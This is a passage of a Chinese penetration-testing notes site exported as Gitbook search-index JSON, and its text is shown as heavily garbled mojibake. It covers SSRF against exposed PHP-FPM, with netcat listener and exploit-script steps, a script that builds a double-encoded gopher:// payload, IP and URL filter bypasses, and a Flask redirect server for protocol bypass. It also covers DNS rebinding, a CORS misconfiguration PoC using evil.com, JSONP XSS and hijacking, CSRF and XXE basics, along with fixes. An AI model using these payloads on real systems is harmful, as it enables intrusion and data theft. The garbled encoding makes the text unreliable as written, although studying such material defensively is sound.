¼å¼çš„æ–‡ä»¶(äº‹å®ä¸Šphp-fpmæ­£æ˜¯å¹²è¿™ä¸ªäº‹çš„)ï¼Œç„¶åæˆ‘ä»¬çš„webæœåŠ¡å™¨å°†ç¿»è¯‘å‡ºæ¥çš„.htmlæ–‡ä»¶å‘ç»™æµè§ˆå™¨ã€‚ è€Œphp-fpmèƒ½å¤Ÿè¿›è¡Œç¿»è¯‘ä¾é çš„å°±æ˜¯Fastcgié€šä¿¡åè®®ã€‚ æ¼æ´æˆå›  PHP-FPMé»˜è®¤ç›‘å¬9000ç«¯å£ï¼Œå¦‚æœè¿™ä¸ªç«¯å£æš´éœ²åœ¨å…¬ç½‘ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥è‡ªå·±æ„é€ fastcgiåè®®ï¼Œå’Œfpmè¿›è¡Œé€šä¿¡ã€‚ fastcgiåè®®ä¼ è¾“çš„æ•°æ®å…¶å®å°±æ˜¯PHPç¯å¢ƒå˜é‡çš„ä¸€éƒ¨åˆ†ã€‚ é€šè¿‡è®¾ç½®auto_prepend_file = php://inputä¸”allow_url_include = Onï¼Œç„¶åå°†æˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„ä»£ç æ”¾åœ¨Bodyä¸­ï¼Œå³å¯æ‰§è¡Œä»»æ„ä»£ç ã€‚ ä½¿ç”¨æ¡ä»¶ PHPæœåŠ¡å™¨å¼€å¯fastcgiçš„ç«¯å£9000 èƒ½å¤Ÿæ‰¾åˆ°PHPæœåŠ¡å™¨ä¸Šçš„phpæ–‡ä»¶ åˆ©ç”¨ exp ç›‘å¬ç«¯å£ï¼šnc -lvp 9000>1.txt ä½¿ç”¨expï¼špython fpm.py -c \"payload\" -p 9000 127.0.0.1 phpæ–‡ä»¶è·¯å¾„ å°†ç”Ÿæˆçš„1.txtè¿›è¡ŒåŒurlç¼–ç ï¼špython 1.py #1.py import urllib.parse f = open(r'1.txt','rb') s = f.read() s = urllib.parse.quote(s) s = urllib.parse.quote(s) print(\"gopher://127.0.0.1:9000/_\"+s) åˆ©ç”¨å¾—åˆ°çš„ç»“æœè¿›è¡Œæ”»å‡» redis respåè®®ï¼Œæ¢è¡Œåˆ†å‰²/x0a/x0d gopheråè®®å¯ä»¥æ„é€ æ•°æ®åŒ… weblogicçš„CRLFæ³¨å…¥ ssrfä¸gopherä¸redis - sijidou - åšå®¢å›­ (cnblogs.com) weblogicä»ssrfåˆ°redisè·å–shell - qianxinggz - åšå®¢å›­ (cnblogs.com) mysql https://paper.seebug.org/510/ bypass IPåœ°å€å˜å½¢ç»•è¿‡IPè¿‡æ»¤ä¸å½“ Demo ç»•è¿‡ï¼šIPåœ°å€å˜å½¢ IPåœ°å€çš„æ•°å­—å½¢å¼ ipåœ°å€çœç•¥å½¢å¼ å¯ä»¥çœç•¥ipåœ°å€ä¸­é—´çš„0ï¼Œå¦‚127.1 == 127.0.0.1 æœ¬åœ°åœ°å€127.0.0.1ç­‰ä»· 127ã€‚0ã€‚0ã€‚1 [::1] # IPV6 localhost 127.233.233.233 Linuxä¸‹127.0.0.1ä¸0.0.0.0æŒ‡å‘åŒä¸€ä¸ªåœ°å€ URIè§£æä¸å½“ç»•è¿‡ http://baidu.com@khaz.top => http://khaz.top åªè§£ææœ€åä¸€ä¸ª@åé¢çš„åŸŸå http://khaz.top#baidu.com => http://khaz.top æ€»ç»“ é‡å®šå‘ç»•è¿‡åè®®é™åˆ¶ pythonè„šæœ¬ from flask import Flask, request, redirect app = Flask(__name__) @app.route('/') def redirect_request(): # ä»è¯·æ±‚å‚æ•°ä¸­è·å– ip, port, scheme, dataï¼Œå¦‚æœç¼ºå¤±åˆ™ç½®ä¸ºç©ºå­—ç¬¦ä¸² ip = request.args.get('ip', '') port = request.args.get('port', '') scheme = request.args.get('s', '') data = request.args.get('data', '') # æ„é€ é‡å®šå‘çš„ URL if scheme == 'file': redirect_url = f\"{scheme}://{data}\" else: redirect_url = f\"{scheme}://{ip}:{port}/{data}\" print(redirect_url) # è¿”å›é‡å®šå‘å“åº” return redirect(redirect_url) if __name__ == '__main__': # å¯åŠ¨ Flask åº”ç”¨ï¼Œç»‘å®šåˆ° 0.0.0.0 å’Œç«¯å£ 8888 app.run(host='0.0.0.0', port=8888, debug=True) 302.php DNS Rebindingç»•è¿‡ä¸æ°å½“çš„åŸŸåè§£æéªŒè¯ çŸ¥é“åˆ›å®‡åœ¨çº¿ http://ceye.io/dns-rebinding åŒä¸€ä¸ªåŸŸåç»‘å®šä¸¤æ¡Aè®°å½•ã€‚è¿™æ ·è§£ææ˜¯éšæœºçš„ã€‚ è‡ªå·±çš„æœåŠ¡å™¨ï¼š éœ€è¦å¤šè¯•å‡ æ¬¡ï¼Œç¢°è¿æ°”ã€‚ å½“æœåŠ¡å™¨ç¬¬ä¸€æ¬¡è§£æå‡ºæ¥æ˜¯ä¸ªå¤–ç½‘ipï¼Œç¬¬äºŒæ¬¡è§£æå‡ºæ¥æ˜¯ä¸ªå†…ç½‘ipçš„æ—¶å€™æ”»å‡»å°±æˆåŠŸäº† è‡ªå»º https://xz.aliyun.com/t/7495#toc-6 urlä¸­çš„unicodeæ¬ºéª— â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© â‘ª â‘« â‘¬ â‘­ â‘® â‘¯ â‘° â‘± â‘² â‘³ â‘´ â‘µ â‘¶ â‘· â‘¸ â‘¹ â‘º â‘» â‘¼ â‘½ â‘¾ â‘¿ â’€ â’ â’‚ â’ƒ â’„ â’… â’† â’‡ â’ˆ â’‰ â’Š â’‹ â’Œ â’ â’ â’ â’ â’‘ â’’ â’“ â’” â’• â’– â’— â’˜ â’™ â’š â’› â’œ â’ â’ â’Ÿ â’  â’¡ â’¢ â’£ â’¤ â’¥ â’¦ â’§ â’¨ â’© â’ª â’« â’¬ â’­ â’® â’¯ â’° â’± â’² â’³ â’´ â’µ â’¶ â’· â’¸ â’¹ â’º â’» â’¼ â’½ â’¾ â’¿ â“€ â“ â“‚ â“ƒ â“„ â“… â“† â“‡ â“ˆ â“‰ â“Š â“‹ â“Œ â“ â“ â“ â“ â“‘ â“’ â““ â“” â“• â“– â“— â“˜ â“™ â“š â“› â“œ â“ â“ â“Ÿ â“  â“¡ â“¢ â“£ â“¤ â“¥ â“¦ â“§ â“¨ â“© â“ª â“« â“¬ â“­ â“® â“¯ â“° â“± â“² â“³ â“´ â“µ â“¶ â“· â“¸ â“¹ â“º â“» â“¼ â“½ â“¾ â“¿ æ¼æ´ä¿®å¤ ç¦æ­¢é‡å®šå‘è·³è½¬ è®¾ç½®URLç™½åå•ï¼ˆé™åˆ¶å¯ä»¥è®¿é—®çš„URLï¼‰ ç¦æ­¢ä¸éœ€è¦çš„åè®® é™åˆ¶ç«¯å£ é‰´æƒï¼Œå¦‚cookieï¼Œjwtç­‰ï¼Œå½“æ”»å‡»è€…åªèƒ½æ§åˆ¶ä¸€ä¸ªurlæ—¶ï¼Œè€Œæ— æ³•æ·»åŠ è¿™äº›è¯·æ±‚å¤´æ—¶ï¼Œå°±æ— æ³•è®¿é—®æŸäº›æ¥å£ æ ¡éªŒäº†å…¶ä»–http headerå­—æ®µæ—¶ï¼Œå¦‚refererï¼ŒUAç­‰ å‚è€ƒæ–‡ç«  https://www.wangan.com/articles/1238#59315b https://zhuanlan.zhihu.com/p/112055947 https://joychou.org/web/phpssrf.html#directory0811578052187574410 https://www.sqlsec.com/2021/05/ssrf.html Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-28 15:42:21 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/08.JSONPä¸CORS/CORS.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/08.JSONPä¸CORS/CORS.html","title":"CORS","keywords":"","body":"å‰ç½®çŸ¥è¯† CORSï¼ˆCross-Origin Resource Sharingï¼‰æ˜¯ä¸€ç§è·¨åŸŸèµ„æºå…±äº«æœºåˆ¶ï¼Œå®ƒå…è®¸Webåº”ç”¨ç¨‹åºä»ä¸åŒçš„åŸŸåè®¿é—®èµ„æºï¼Œè€Œä¸å—åŒæºç­–ç•¥çš„é™åˆ¶ã€‚CORSæœºåˆ¶éœ€è¦åœ¨æœåŠ¡ç«¯è¿›è¡Œé…ç½®ï¼Œå¹¶ä¸”éœ€è¦åœ¨æ¯ä¸ªè·¨åŸŸè¯·æ±‚ä¸­æ·»åŠ ç‰¹å®šçš„HTTPå¤´éƒ¨ä¿¡æ¯ï¼Œä¾‹å¦‚â€œAccess-Control-Allow-Originâ€å’Œâ€œAccess-Control-Allow-Methodsâ€ç­‰ã€‚CORSæœºåˆ¶å¯ä»¥æ”¯æŒå„ç§ç±»å‹çš„HTTPè¯·æ±‚ï¼ŒåŒ…æ‹¬GETã€POSTã€PUTã€DELETEç­‰ï¼Œå› æ­¤å®ƒåœ¨Webåº”ç”¨ç¨‹åºä¸­çš„åº”ç”¨éå¸¸å¹¿æ³›ã€‚ å®¢æˆ·ç«¯--CORSç®€å•è¯·æ±‚ ç¬¦åˆä»¥ä¸‹æ¡ä»¶çš„ä¸ºç®€å•è¯·æ±‚ è¯·æ±‚æ–¹æ³•ä¸ºgetï¼Œpostï¼Œheadä¸­çš„ä¸€ç§ headerå¤´ä¸ºä»¥ä¸‹å­—æ®µçš„å­é›† Accept Accept-language Content-language Last-Event-ID Content-Type:application/x-www-form-urlencoded,multipart/form-data,text/plain å®¢æˆ·ç«¯--CORSéç®€å•è¯·æ±‚ï¼ˆä¸ç¬¦åˆç®€å•è¯·æ±‚çš„æ¡ä»¶æ—¶ï¼‰ å®¢æˆ·ç«¯éç®€å•è¯·æ±‚æµç¨‹ ç¬¬ä¸€æ¬¡è¯·æ±‚ä¸ºé¢„æ£€è¯·æ±‚ï¼ˆOPTIONSæ–¹æ³•ï¼ŒOriginè¯·æ±‚å¤´ï¼‰ æ ¹æ®æœåŠ¡å™¨è¿”å›çš„responseæ¥åˆ¤æ–­æ˜¯å¦èƒ½å¤Ÿå‘èµ·CORSè¯·æ±‚ æœåŠ¡ç«¯é…ç½® ç›¸å…³çš„å¤´éƒ¨å­—æ®µå«ä¹‰ Access-Control-Allow-Origin: å¿…éœ€é¡¹ï¼Œå‘Šè¯‰æµè§ˆå™¨å…è®¸è¯¥æºè®¿é—®èµ„æºã€‚ Access-Control-Allow-Headers: å¿…éœ€é¡¹ï¼ŒæŒ‡æ˜äº†å®é™…è¯·æ±‚ä¸­å…è®¸æºå¸¦çš„æ ‡å¤´å­—æ®µã€‚ Access-Control-Allow-Methods: å¯é€‰é¡¹ï¼ŒæŒ‡å®šäº†è®¿é—®èµ„æºæ—¶å…è®¸ä½¿ç”¨çš„è¯·æ±‚æ–¹æ³• Access-Control-Allow-Credentials:è¡¨ç¤ºæ˜¯å¦å…è®¸å‘é€cookieï¼Œé»˜è®¤ä¸å…è®¸ã€‚è®¾ç½®ä¸ºtrueæ—¶ï¼Œå¯ä»¥å‘é€cookie Nginxé…ç½®Demo location = /corstest.php { root /var/www/html; add_header Access-Control-Allow-Origin *; add_header Access-Control-Allow-Methods 'GET, POST, OPTIONS'; add_header Access-Control-Allow-Headers 'DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization'; if ($request_method = 'OPTIONS') { return 204; } â€¦â€¦ } ä»£ç é…ç½®Demo æœåŠ¡ç«¯å¯¹äºè·¨åŸŸè¯·æ±‚çš„å¤„ç†æµç¨‹ é”™è¯¯çš„Access-Control-Allow-Originé…ç½® http://debug.io:90/cors_read.html var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1/cors.php', true); // If specified, responseType must be empty string or \"text\" xhr.responseType = 'text'; xhr.onload = function () { if (xhr.readyState === xhr.DONE) { if (xhr.status === 200) { document.write(xhr.responseText); } } }; xhr.send(null); http://127.0.0.1/cors.php name password Jack 1ui23p=13! æ²¡æœ‰è®¾ç½®Access-Control-Allow-Origin è®¾ç½®Access-Control-Allow-Originä¸º*æ—¶ è®¾ç½®Access-Control-Allow-Originä¸ºtest.comæ—¶ æ¼æ´å±å®³ corså¦‚æœé…ç½®ä¸å½“ï¼Œå°±å¯èƒ½å¯¼è‡´æ”»å‡»è€…é€šè¿‡æ¶æ„ç½‘ç«™æˆ–ä»£ç æ‰§è¡Œè·¨åŸŸè¯·æ±‚ï¼Œä»è€Œè·å–æˆ–ç¯¡æ”¹ç”¨æˆ·çš„æ•æ„Ÿæ•°æ®ï¼ˆå±å®³å’ŒCSRFç±»ä¼¼ï¼Œä¸è¿‡å¯ä»¥åŠ«æŒè¿”å›çš„å†…å®¹ï¼‰ã€‚ æ¼æ´åŸç† Java:https://mp.weixin.qq.com/s/PSU8T-IO3mAz4MEVvAeUug PHP:https://mp.weixin.qq.com/s/ViSR-l41Z9qsazxI2MAhTA POC è¯·æ±‚åŒ…åŠ å…¥ origin:http://evil.com è§‚å¯Ÿå“åº”å¤´ Access-Control-Allow-Origin: */null/http://evil.com Access-Control-Allow-Credentials: true æ¼æ´ä¿®å¤ é™åˆ¶Access-Control-Allow-origin çš„å€¼ä¸ºå¯ä¿¡æºï¼Œå°½å¯èƒ½è®¾ç½®ç™½åå•ï¼Œä¸èƒ½ä¸º*ï¼Œä¹Ÿä¸èƒ½ä¸º null é¿å… Access-Control-Allow-Credentials çš„å€¼ä¸º True è®¾ç½® Access-Control-Allow-Methods5ï¼ˆå…è®¸çš„ HTTP æ–¹æ³•ï¼‰ã€Access-Control-Allow-Headers(å…è®¸çš„è¯·æ±‚å¤´) Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-18 23:46:45 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/08.JSONPä¸CORS/JSONPè·¨åŸŸæ¼æ´.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/08.JSONPä¸CORS/JSONPè·¨åŸŸæ¼æ´.html","title":"JSONPè·¨åŸŸæ¼æ´","keywords":"","body":"å‰ç½®çŸ¥è¯† åŒæºç­–ç•¥ ç›®çš„ åŒæºç­–ç•¥çš„ç›®çš„ï¼Œæ˜¯ä¸ºäº†ä¿è¯ç”¨æˆ·ä¿¡æ¯çš„å®‰å…¨ï¼Œé˜²æ­¢æ¶æ„çš„ç½‘ç«™çªƒå–æ•°æ®ã€‚ è®¾æƒ³è¿™æ ·ä¸€ç§æƒ…å†µï¼šAç½‘ç«™æ˜¯ä¸€å®¶é“¶è¡Œï¼Œç”¨æˆ·ç™»å½•ä»¥åï¼Œåˆå»æµè§ˆå…¶ä»–ç½‘ç«™ã€‚å¦‚æœå…¶ä»–ç½‘ç«™å¯ä»¥è¯»å–Aç½‘ç«™çš„ Cookieï¼Œä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ å¾ˆæ˜¾ç„¶ï¼Œå¦‚æœ Cookie åŒ…å«éšç§ï¼ˆæ¯”å¦‚å­˜æ¬¾æ€»é¢ï¼‰ï¼Œè¿™äº›ä¿¡æ¯å°±ä¼šæ³„æ¼ã€‚æ›´å¯æ€•çš„æ˜¯ï¼ŒCookie å¾€å¾€ç”¨æ¥ä¿å­˜ç”¨æˆ·çš„ç™»å½•çŠ¶æ€ï¼Œå¦‚æœç”¨æˆ·æ²¡æœ‰é€€å‡ºç™»å½•ï¼Œå…¶ä»–ç½‘ç«™å°±å¯ä»¥å†’å……ç”¨æˆ·ï¼Œä¸ºæ‰€æ¬²ä¸ºã€‚å› ä¸ºæµè§ˆå™¨åŒæ—¶è¿˜è§„å®šï¼Œæäº¤è¡¨å•ä¸å—åŒæºæ”¿ç­–çš„é™åˆ¶ã€‚ ç”±æ­¤å¯è§ï¼Œ\"åŒæºç­–ç•¥\"æ˜¯å¿…éœ€çš„ï¼Œå¦åˆ™ Cookie å¯ä»¥å…±äº«ï¼Œäº’è”ç½‘å°±æ¯«æ— å®‰å…¨å¯è¨€äº†ã€‚ å®šä¹‰ ä¸¤ä¸ªwebç•Œé¢åªæœ‰åŒåè®®ï¼ŒåŒåŸŸåï¼ŒåŒç«¯å£æ‰æ˜¯åŒæºçš„ jsonp JSONPï¼ˆJSON with Paddingï¼‰å³å¡«å……å¼çš„JSONï¼Œé€šè¿‡å¡«å……é¢å¤–çš„å†…å®¹æŠŠJSONæ•°æ®åŒ…è£…èµ·æ¥ï¼Œå˜æˆä¸€æ®µæœ‰æ•ˆçš„å¯ä»¥ç‹¬ç«‹è¿è¡Œçš„JavaScriptè¯­å¥ã€‚å®ƒæ˜¯åŸºäºJSON æ ¼å¼çš„ä¸ºè§£å†³è·¨åŸŸè¯·æ±‚èµ„æºè€Œäº§ç”Ÿçš„è§£å†³æ–¹æ¡ˆï¼ŒåŸºæœ¬åŸç†æ˜¯åˆ©ç”¨HTMLé‡Œscriptå…ƒç´ æ ‡ç­¾ï¼Œè¿œç¨‹è°ƒç”¨JSONæ–‡ä»¶æ¥å®ç°æ•°æ®ä¼ é€’ã€‚ ä¸‹é¢é€šè¿‡Demoä»£ç æ¼”ç¤º å‡è®¾http://debug.io:90/ æœåŠ¡å™¨å­˜æ”¾JSONæ•°æ® //jsonp.php é‚£ä¹ˆhttp://localhostå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è·å–http://debug.io:90/ä¸Šå­˜æ”¾çš„JSONæ•°æ® scriptæ ‡ç­¾çš„srcå±æ€§ function test(data) { alert(data.name); } ajaxè¯·æ±‚ $.getJSON(\"http://debug.io:90/jsonp.php?callback=?\", function(data){ alert(data.age); }); æ¼æ´åŸç† JSONPè·¨åŸŸæ¼æ´æ˜¯æŒ‡ç½‘ç«™JSONPæ¥å£callbackå‚æ•°å€¼å¯è‡ªå®šä¹‰å¯¼è‡´çš„XSSå’ŒJSONPåŠ«æŒ æ¼æ´åˆ©ç”¨ XSS å½“Content-Typeä¸ºtext/htmlä¸”æœªå¯¹callbackå‚æ•°è¿›è¡Œè¿‡æ»¤æ—¶å‡ºç° // æ”»å‡»è€…æ„é€  http://api.example.com/data?callback=alert('xss') JSONPåŠ«æŒ å½“ç½‘ç«™çš„JSONPæ¥å£æ²¡æœ‰åšå¥½é˜²æŠ¤ï¼Œå¹¶ä¸”å­˜åœ¨æ•æ„Ÿæ•°æ®æ—¶ï¼Œæ”»å‡»è€…å°±å¯ä»¥æ„é€ æ¶æ„çš„htmlé¡µé¢è¯±å¯¼å—å®³è€…ç‚¹å‡»ï¼Œä»è€Œæºå¸¦ç”¨æˆ·çš„cookieç­‰ä¿¡æ¯å‘jsonpæ¥å£å‘èµ·è¯·æ±‚ï¼Œå¹¶é€šè¿‡callbackå°†è·å–åˆ°çš„æ•æ„Ÿæ•°æ®å‘ç»™æ”»å‡»è€…ã€‚ http://www.mi1k7ea.com/2019/08/20/JSONP%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#Referer%E7%BB%95%E8%BF%87 åˆ©ç”¨æ‰‹æ³• è·å–jsonpä¸­çš„æ•æ„Ÿä¿¡æ¯ æ°´å‘æ”»å‡» æ°´å‘æ”»å‡»å°±æ˜¯åœ¨å—å®³è€…å¿…ç»ä¹‹è·¯è®¾ç½®ä¸€ä¸ªæ°´å‘ï¼Œä¹Ÿå°±æ˜¯é™·é˜±ã€‚æ”»å‡»è€…é€šè¿‡åˆ†æå—å®³è€…çš„ä¸Šç½‘æ´»åŠ¨è§„å¾‹ï¼Œç»å¸¸è®¿é—®å“ªäº›ç½‘ç«™ï¼Œç„¶ååˆ©ç”¨ç½‘ç«™æ¼æ´åœ¨å…¶ä¸­æ¤å…¥æ”»å‡»ä»£ç ã€‚æ¯”å¦‚æ”»å‡»è€…é€šè¿‡åˆ†æå¾—çŸ¥å—å®³è€…ç»å¸¸è®¿é—®ç½‘ç«™Aå’ŒBï¼Œå¹¶æƒ³è¦å¾—åˆ°å—å®³è€…åœ¨ç½‘ç«™Aä¸Šçš„æ•æ„Ÿæ•°æ®ï¼Œè€Œç½‘ç«™Bå®‰å…¨æ€§ç›¸å¯¹è–„å¼±ï¼Œäºæ˜¯æ”»å‡»è€…åœ¨ç½‘ç«™Bä¸­æ¤å…¥JSONPåˆ©ç”¨ä»£ç ï¼Œå½“å—å®³è€…è®¿é—®ç½‘ç«™Bæ—¶ï¼Œå°±ä¼šé€šè¿‡JSONPè·¨åŸŸè®¿é—®ç½‘ç«™Aä»è€Œè·å–å—å®³è€…åœ¨ç½‘ç«™Aä¸Šçš„æ•æ„Ÿæ•°æ®ã€‚ èœœç½æº¯æº èœœç½èƒ½å¤Ÿå¯¹æ”»å‡»è€…ç”»åƒè¿›è¡Œç”»åƒå’Œæº¯æºçš„åŸç†å°±æ˜¯èœœç½ä¸­é›†æˆäº†å¤§é‡ç¤¾äº¤ç½‘ç«™çš„JSONPæ¥å£ã€‚å½“æ”»å‡»è€…å‘èµ·æ”»å‡»æ—¶ï¼Œå¦‚æœå…¶ä½¿ç”¨çš„æµè§ˆå™¨ä¿å­˜äº†ç¤¾äº¤ç½‘ç«™çš„ç™»å½•ä¿¡æ¯ï¼Œå°±æœ‰å¯èƒ½å› ä¸ºè§¦å‘äº†èœœç½çš„JSONPåˆ©ç”¨ä»£ç è€Œç•™ä¸‹ä¸ªäººç¤¾äº¤ä¿¡æ¯ã€‚ æ¼æ´ä¿®å¤ å¯¹è¯·æ±‚çš„æ¥æºè¿›è¡Œæ ¡éªŒï¼Œå¦‚Refererï¼ŒOriginç­‰å‚æ•° å°½é‡ä¸ä½¿ç”¨JSONPæ¥å£æ¥ä¼ è¾“æ•æ„Ÿæ•°æ® ä½¿ç”¨CORSæ¥ä»£æ›¿JSONP äºŒè€…åŒºåˆ« JSONPæ˜¯æµè§ˆå™¨é»˜è®¤æ”¯æŒçš„è·¨åŸŸæ–¹å¼ï¼ˆè·¨åŸŸåŠ è½½javascriptï¼‰ï¼ŒCORSæ˜¯W3Cæä¾›çš„ä¸€ä¸ªè·¨åŸŸæ ‡å‡† JSONPåªæ”¯æŒGETæ–¹æ³•ï¼ŒCORSå¯ä»¥è‡ªå®šä¹‰æ”¯æŒçš„æ–¹æ³• JSONPå‡ ä¹æ”¯æŒæ‰€æœ‰çš„æµè§ˆå™¨ï¼ŒCORSä¸æ”¯æŒIE10ä¸‹çš„æµè§ˆå™¨ JSONPä¼ é€’çš„æ•°æ®è¦ç¬¦åˆJavaScriptä»£ç è§„èŒƒï¼ŒCORSå¯ä»¥æ˜¯htmlï¼Œxmlç­‰å¤šç§æ ¼å¼ å‚è€ƒæ–‡ç«  ã€ŠWebæ¼æ´è§£æä¸æ”»é˜²å®æˆ˜ã€‹ JSONPæŒ–æ˜ä¸é«˜çº§åˆ©ç”¨ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-23 16:21:29 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/09.CSRF/CSRF.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/09.CSRF/CSRF.html","title":"CSRF","keywords":"","body":"æ¼æ´åŸç† CSRFï¼ˆCross-site request forgeryï¼‰è·¨ç«™è¯·æ±‚ä¼ªé€ æ”»å‡»ï¼šæ”»å‡»è€…é€šè¿‡ä¸€äº›æŠ€æœ¯æ‰‹æ®µæ¬ºéª—ç”¨æˆ·çš„æµè§ˆå™¨å»è®¿é—®ä¸€ä¸ªç”¨æˆ·è‡ªå·±æ›¾ç»è®¤è¯è¿‡çš„ç½‘ç«™å¹¶æ‰§è¡Œä¸€äº›æ“ä½œï¼ˆå¦‚å‘é‚®ä»¶ï¼Œå‘æ¶ˆæ¯ï¼Œç”šè‡³è´¢äº§æ“ä½œå¦‚è½¬è´¦å’Œè´­ä¹°å•†å“ï¼‰ã€‚ ç®€å•æ¥è¯´å°±æ˜¯ä½ ç‚¹å‡»æˆ‘æ„é€ çš„æ¶æ„é“¾æ¥ï¼Œæˆ‘å°±å¯ä»¥ä»¥ä½ çš„åä¹‰ï¼ˆæµè§ˆå™¨ä¸­å­˜å‚¨çš„èº«ä»½è®¤è¯ä¿¡æ¯ï¼‰å»å‘èµ·ä¸€ä¸ªhttpè¯·æ±‚ æ”»å‡»è€…å¯ä»¥é¢„å…ˆä¼ªé€ ç”¨æˆ·çš„è¯·æ±‚ ä¼ªé€ çš„è¯·æ±‚å¯ä»¥ä½¿ç”¨å­˜å‚¨çš„Cookie æ¼æ´å±å®³ ä¼ªé€ ç”¨æˆ·è¯·æ±‚ï¼Œç”¨æˆ·èƒ½åšå•¥ï¼Œè¿™ä¸ªæ¼æ´å°±èƒ½åšå•¥ å¸¸è§åœºæ™¯ ä¿®æ”¹å¯†ç ï¼Œä¿®æ”¹ä¸ªäººä¿¡æ¯ï¼Œè®¢å•ä¿¡æ¯ç­‰ åˆ›å»ºç”¨æˆ·ï¼Œå‘é€é‚®ä»¶ç­‰ æ•°æ®åŒ…æ— tokenå’ŒrefereréªŒè¯ æ— tokenéªŒè¯å¹¶ä¸”æ— refereréªŒè¯æ—¶ï¼Œå°±åŸºæœ¬å­˜åœ¨è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œä½†åŸºäºåŠŸèƒ½ç‚¹ä¸åŒï¼Œä¸€äº›ä¸ºæ— æ„ä¹‰æ— å±å®³çš„è·¨ç«™è¯·æ±‚ä¼ªé€ ã€‚ æäº¤æ•°æ®åŒ…æ—¶æŠ“åŒ…åˆ é™¤refererå­—æ®µï¼Œå¦‚æœä¸æŠ¥é”™ï¼Œåˆ™åŸºæœ¬å­˜åœ¨è·¨åŸŸè¯·æ±‚ä¼ªé€ ï¼ŒGETå‹æ„é€ é“¾æ¥ï¼ŒPOSTå‹å†™ä¸€ä¸ªæäº¤è¡¨å•ï¼Œæµ‹è¯•æœ‰è·¨åŸŸæƒ…å†µä¸‹æäº¤çš„æ•°æ®åŒ…æ˜¯å¦ç”Ÿæ•ˆã€‚ æ•°æ®åŒ…æ— tokenæœ‰refereréªŒè¯ â€‹ åªæœ‰refereréªŒè¯æ—¶ï¼Œå¯å°è¯•ç©ºrefereræˆ–è€…å°è¯•åŸŸåä¼ªé€ ã€‚ POC GET POST burpå³é”®ç”Ÿæˆ æ¼æ´ä¿®å¤ å½“ç”¨æˆ·å‘é€é‡è¦çš„è¯·æ±‚æ—¶éœ€è¦è¾“å…¥åŸå§‹å¯†ç ï¼Œæ‰‹æœºéªŒè¯ç ç­‰ è®¾ç½®Token æ£€éªŒ referer æ¥æº ç–‘é—®ï¼šrefererä¸æ˜¯å¯ä»¥è¿›è¡Œä¼ªé€ å—ï¼Ÿ ç­”ï¼šæ”»å‡»è€…ç¡®å®å¯ä»¥åœ¨å‘é€è¯·æ±‚æ—¶è¿›è¡Œä¼ªé€ ï¼Œä½†æ˜¯csrfæ˜¯ç”¨æˆ·å‘èµ·è¯·æ±‚ï¼Œç”¨æˆ·ä¸ä¼šå»ä¼ªé€ ï¼› ä¸è¿‡å½“ç½‘ç«™æœ¬èº«å¯ä»¥æ¤å…¥csrfçš„payloadæ—¶ï¼Œæ£€éªŒreferæ¥æºçš„é˜²å¾¡æ‰‹æ®µå°±å¤±æ•ˆäº†ã€‚ è®¾ç½®SameSite â€‹ SameSite æ˜¯ HTTP Cookie çš„ä¸€ä¸ªå±æ€§ï¼Œç”¨äºé™åˆ¶ Cookie çš„å‘é€èŒƒå›´ï¼Œç¡®ä¿ Cookie ä¸ä¼šåœ¨è·¨ç«™è¯·æ±‚ä¸­è¢«æ»¥ç”¨ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-28 15:45:24 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/10.XXE/XXE.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/10.XXE/XXE.html","title":"XXE","keywords":"","body":"XML åŸºç¡€ å®šä¹‰ XMLæ˜¯å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆeXtensible Markup Languageï¼‰çš„ç¼©å†™ï¼Œå®ƒæ˜¯æ˜¯ä¸€ç§æ•°æ®è¡¨ç¤ºæ ¼å¼ï¼Œå¯ä»¥æè¿°éå¸¸ å¤æ‚çš„æ•°æ®ç»“æ„ï¼Œå¸¸ç”¨äºä¼ è¾“å’Œå­˜å‚¨æ•°æ®ã€‚ ä¸htmlçš„è”ç³»å’ŒåŒºåˆ« HTML è¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ® XML è¢«è®¾è®¡ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ® å¯¹ XML æœ€å¥½çš„æè¿°æ˜¯ï¼š XML æ˜¯ç‹¬ç«‹äºè½¯ä»¶å’Œç¡¬ä»¶çš„ä¿¡æ¯ä¼ è¾“å·¥å…·ã€‚ è¯­æ³• æ ¼å¼ XMLå£°æ˜ï¼šç‰ˆæœ¬ï¼Œç¼–ç ä¿¡æ¯ï¼ˆå¯é€‰ï¼Œå¦‚æœå­˜åœ¨å°±å¿…é¡»æ”¾åœ¨æ–‡æ¡£çš„é¦–è¡Œï¼‰ DTD:Document Type Definition å³æ–‡æ¡£ç±»å‹å®šä¹‰ (å¯é€‰) æ–‡æ¡£å…ƒç´  å…¸å‹xmlæ–‡æ¡£ä¾‹å­ ]> Tove Jani Reminder Don't forget me this weekend! &xxe; DTDä¸å®ä½“ DTD 